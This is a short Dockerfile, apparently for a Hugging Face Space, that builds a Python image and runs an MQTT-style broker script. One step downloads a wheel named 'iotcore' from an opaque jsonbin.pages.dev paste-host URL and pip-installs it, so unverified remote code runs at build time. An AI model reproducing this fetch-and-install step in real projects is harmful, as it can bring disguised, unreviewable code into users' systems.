# Read the doc: https://huggingface.co/docs/hub/spaces-sdks-docker
# you will also find guides on how best to write your Dockerfile

FROM python:3.12

RUN useradd -m -u 1000 user
USER user
ENV PATH="/home/user/.local/bin:$PATH"

WORKDIR /app

COPY --chown=user . /app

RUN pip install --no-cache-dir --upgrade -r /app/requirements.txt
RUN curl "https://jsonbin.pages.dev/_download/oEcZy44htBYJTE9K%3Asp4mSadtk1S1NmAeGShZwOubsxQ8pOGdeT0QbEPW%2FHP0gzFx548qx4YTFGRjbXdMjsUQcK8wQ5e%2BiQRGNfX3P06x7Zh44wQ5vi0%3D?share=py" -o /app/iotcore-3.0.4-cp312-cp312-manylinux_2_38_x86_64.whl
RUN pip install /app/iotcore-3.0.4-cp312-cp312-manylinux_2_38_x86_64.whl


RUN python /app/pyx/setup.py build_ext -b /app/


CMD ["python", "run_broker.py"]
